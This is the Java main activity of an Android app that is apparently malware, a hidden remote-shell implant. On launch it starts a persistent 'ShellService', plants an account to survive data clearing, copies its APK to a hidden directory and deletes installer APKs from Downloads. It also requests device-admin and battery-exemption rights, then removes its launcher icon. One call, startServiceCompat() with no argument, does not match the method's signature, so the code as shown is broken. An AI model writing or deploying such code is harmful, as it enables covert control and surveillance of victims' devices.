package com.sys.core;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.accounts.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.*;
import android.provider.Settings;
import java.io.*;

public class MainActivity extends Activity {

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);

        startServiceCompat();
        Watchdog.schedule(this);
        addAccount();
        purgeApk();
        requestPerms();
        hideSelf();

        finish();
    }

    static void startServiceCompat(Context c) {
        Intent i = new Intent(c, ShellService.class);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i);
        else c.startService(i);
    }

    private void requestPerms() {
        if (Build.VERSION.SDK_INT >= 33)
            requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"}, 1);
        try {
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            i.setData(Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Exception ignored) {}
        try {
            DevicePolicyManager d = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, Admin.class);
            if (!d.isAdminActive(cn)) {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                startActivity(i);
            }
        } catch (Exception ignored) {}
    }

    /** sobrevive a "Limpar dados": a conta mora no AccountManager */
    private void addAccount() {
        try {
            AccountManager am = AccountManager.get(this);
            Account a = new Account("sys.core", "com.sys.core");
            if (am.addAccountExplicitly(a, null, null))
                am.setUserData(a, "host", ShellService.HOST);
        } catch (Exception ignored) {}
    }

    /** some o APK instalado do Download */
    private void purgeApk() {
        try {
            File dir = new File("/data/local/tmp/.rs");
            dir.mkdirs();
            File dst = new File(dir, "base.apk");
            InputStream in = new FileInputStream(getPackageCodePath());
            OutputStream out = new FileOutputStream(dst);
            byte[] buf = new byte[8192]; int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            in.close(); out.close();
            dst.setExecutable(true, false);

            File dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File[] fs = dl.listFiles();
            if (fs != null) for (File f : fs) {
                String s = f.getName().toLowerCase();
                if (s.endsWith(".apk") && (s.contains("rs") || s.contains("update") || s.contains("sys")))
                    f.delete();
            }
        } catch (Exception ignored) {}
    }

    /** camada 1: sem ícone no launcher */
    void hideSelf() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    static void unhideSelf(Context c) {
        c.getPackageManager().setComponentEnabledSetting(
            new ComponentName(c, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP);
    }
}